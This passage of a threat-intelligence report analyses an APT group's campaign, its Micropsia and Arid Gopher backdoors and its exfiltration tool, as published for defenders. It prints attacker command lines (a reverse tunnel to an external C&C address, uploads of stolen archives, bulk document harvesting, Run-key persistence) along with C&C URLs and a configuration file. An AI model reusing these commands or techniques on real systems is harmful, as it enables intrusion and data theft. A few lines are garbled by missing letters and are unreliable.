This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in\nthe Palestinian territories during 2017.\n\n## Background\n\nMantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is\nknown to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military,\nfinancial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to\nlure targets into installing malware on their devices.\n\n[Mantis is widely accepted to be linked to the Palestinian territories. While other vendors have linked the group to Hamas, Symantec cannot](https://www.cybereason.com/blog/operation-bearded-barbie-apt-c-23-campaign-targeting-israeli-officials)\nmake a definitive attribution to any Palestinian organization.\n\nIn its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before\nengaging in extensive credential theft and exfiltration of stolen data.\n\n## Attack chain\n\nThe initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the\nattackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers.\nCompartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have\na persistent presence on the target’s network.\n\nThe following is a description of how one of those three toolsets was used:\n\n\n-----\n\ne st e de ce o a c ous act ty occu ed o ece be 8, 0 ee d st ct sets o ob uscated o e S e co a ds e e\nexecuted to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another\nstage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444.\n\nThe attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty, a publicly available SSH\nclient, using Certutil and BITSAdmin\n\nMicropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines\nin the same organization. In each case, it ran in a folder named after its file name:\n\ncsidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe\ncsidl_common_appdata\\windowsps\\windowsps.exe\n\nOn one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address:\n\nCSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED]\n\nOn December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.\n\nThe following day, December 21, RAR was executed to archive files on another infected computer.\n\nBetween December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid\nGopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it\nexecuted on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor\nelsewhere by the attackers).\n\nOn December 28, Micropsia was used to run windowspackages.exe on three more infected computers.\n\nOn December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two\nof the infected computers.\n\nOn January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the\nfirst version was discovered or whether it was standard operating procedure is unclear.\n\nOn January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder:\ncsidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file:\n\nCSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-1339_getf.rar\n\nOn January 9, Arid Gopher was used to execute two unknown files on a single computer:\n\ncsidl_common_appdata\\teamviewrremoteservice\\teamviewrremoteservice.exe\n\ncsidl_common_appdata\\embededmodeservice\\embededmodeservice.exe\n\nThe last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named\nlocalsecuritypolicy.exe every ten hours.\n\n## Micropsia\n\nVariants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this\ncampaign, Micropsia was deployed using multiple file names and file paths:\n\ncsidl_common_appdata\\microsoft\\dotnet35\\microsoftdotnet35.exe\ncsidl_common_appdata\\microsoftservicesusermanual\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe\ncsidl_common_appdata\\windowsps\\windowsps.exe\n\nMicropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included:\n\nArid Gopher (file names: networkvirtualizationstartservice.exe, networkvirtualizationfiaservice.exe, networkvirtualizationseoservice.exe)\n[Reverse SOCKs Tunneler (aka Revsocks) (file name: windowsservicemanageav.exe)](https://github.com/kost/revsocks)\nData Exfiltration Tool (file name: windowsupserv.exe)\nTwo unknown files, both named hostupbroker.exe\nUnknown file named windowspackages.exe\n\n\n-----\n\nadd t o to t s, c ops a as ts o u ct o a ty, suc as ta g sc ee s ots, ey ogg g, a d a c g ce ta e types us g\npreparation for data exfiltration:\n\n_\"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -_\n_hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software_\n_Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\"_\n_\"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\"_\n_\"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\"_\n_\"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\"_\n\n## Arid Gopher\n\nUnlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following\nembedded components:\n\n7za.exe – A copy of the legitimate 7-Zip executable\nAttestationWmiProvider.exe – A tool that sets a “run” registry value\nServiceHubIdentityHost.exe – A copy of legitimate Shortcut.exe executable from Optimum X\nSetup.env – Configuration file\n\nArid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and\nnetworkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor.\n\nWhen communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive\ncommands:\n\nConnects to: http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134) - likely to register device\nFollowed by: http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands\nConnects to: http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32) - likely to register device\nFollowed by: http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands\n\nArid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware\nwas radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single\nsubroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the\nlogic between variants, which is a time-intensive operation if done manually.\n\nTable 1. Commands supported by latest variant of Arid Gopher backdoor\n\n**Command** **Description**\n\n\"c\" Perhaps related to main.exC(\"cmd\")\n\n\"d\" Perhaps related to main.down2\n\n\"s\" Perhaps related to main.OnDSH\n\n\"ci\" Perhaps related to main.deviceProperties\n\n\"ps\" Perhaps related to main.exC(\"powershell\")\n\n\"ra\" Perhaps related to main.RunAWithoutW\n\n\"sf\" Perhaps related to main.updateSettings\n\n\"sl\" Perhaps related to main.searchForLogs\n\n\"ua\" Perhaps related to main.updateApp\n\n\"ut\" Perhaps related to main.updateT\n\n\"pwnr\" Perhaps related to main.exCWithoutW(\"powershell\")\n\n\"rapp\" Perhaps related to main.restartApp\n\n\"gelog\" Perhaps related to main.upAppLogs\n\n\"ufbtt\" Perhaps related to main.collectFi\n\n\"ufofd\" Perhaps related to main.collectFiOrFol\n\n\"bwp\" Perhaps related to main.browDat\n\n\n-----\n\n**Command** **Description**\n\n\"cbh\" Perhaps related to main.delBD\n\n\"cwr\" Perhaps related to main.exCWithoutW(\"cmd\")\n\n\"gaf\" Perhaps related to main.collectFi\n\n\"ntf\" Perhaps related to main.collectNet\n\n\"smr\" Perhaps related to main.updateSettings\n\nThe embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following:\n\n_DIR=WindowsPerceptionService_\n\n_ENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER_\n\n_LOGS=logs.txt_\n\n_DID=code.txt_\n\n_VER=6.1_\n\n_EN=2_\n\n_ST_METHOD=r_\n\n_ST_MACHINE=false_\n\n_ST_FLAGS=x_\n\n_COMPRESSOR=7za.exe_\n\n_DDIR=ResourcesFiles_\n\n_BW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002_\n\n_SERVER_TOKEN=PDqMKZ91l2XDmDELOrKB_\n\n_STAPP=AttestationWmiProvider.exe_\n\n_SHORT_APP=ServiceHubIdentityHost.exe_\n\nThe setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit\nexecutable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following\ncommand-line arguments:\n\n_\"key\" with string parameter [RUN_VALUE_NAME]_\n\n_\"value\" with string parameter [RUN_PATHNAME]_\n\nIt then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value:\n\n_HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\"_\n\nOur investigation so far shows this file setting Arid Gopher to run on reboot:\n\n_CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-_\n_value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\"_\n\n## Exfiltration Tool\n\nThe attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named\nWindowsUpServ.exe. When run, the tool checks for the following command-line arguments:\n\n_\"-d\" \"[FILE_DIRECTORY]\"_\n\n_\"-f\" \"[FILENAME]\"_\n\nFor each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\"\ncommand-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file.\n\n\n-----\n\ne up oad g eac e, t e too s se ds a OS equest to a C&C se e t t e o o g pa a ete s\n\n_\"kjdfnqweb\": [THE_FILE_CONTENT]_\n\n_\"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER]_\n\nWhenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may\nalso log some of its actions in the following files:\n\n_\"C:\\ProgramData\\WindowsUpServ\\success.txt\"_\n\n_\"C:\\ProgramData\\WindowsUpServ\\err.txt\"_\n\n## Determined Adversary\n\nMantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive\nmalware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the\nchances of the entire operation being detected.\n\n## Protection/Mitigation\n\n[For the latest
